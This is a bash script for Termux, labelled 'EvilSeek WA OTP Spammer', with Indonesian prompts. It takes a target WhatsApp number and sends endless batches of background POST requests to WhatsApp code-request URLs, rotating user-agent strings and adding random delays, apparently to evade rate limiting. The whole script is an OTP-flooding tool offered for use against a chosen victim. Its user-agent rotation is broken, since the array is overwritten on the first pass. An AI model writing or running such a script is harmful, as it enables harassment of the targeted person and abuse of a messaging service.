#!/data/data/com.termux/files/usr/bin/bash
# EvilSeek WA OTP Spammer - Bash Version

PHONE="+6281234567890"   # ganti sesuai target
URLS=("https://api.whatsapp.com/sendcode" "https://web.whatsapp.com/otp/request")
UA=("Mozilla/5.0 (Linux; Android 13)" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0)")

echo -e "\e[33m1010\n0110\n1010\n0110\n1010  SPAMMER\n0110\n10001010101\n01010100010\e[0m"
echo "[1] SPAM OTP INFINITE LOOP <nomer WA>"
echo "[2] EXIT"
read -p "Pilih: " pilih

if [ $pilih -eq 1 ]; then
    read -p "Masukkan nomor WA: " PHONE
    echo "Mulai spam infinite ke $PHONE (Ctrl+C stop)"
    while true; do
        for i in {1..50}; do
            URL=${URLS[$RANDOM % ${#URLS[@]}]}
            UA=${UA[$RANDOM % ${#UA[@]}]}
            curl -s -X POST "$URL" \
                 -H "User-Agent: $UA" \
                 -H "Content-Type: application/x-www-form-urlencoded" \
                 -d "phone=$PHONE" \
                 -o /dev/null &
            sleep $(awk -v min=0.2 -v max=1.0 'BEGIN{srand(); print min+rand()*(max-min)}')
        done
        wait
    done
else
    exit
fi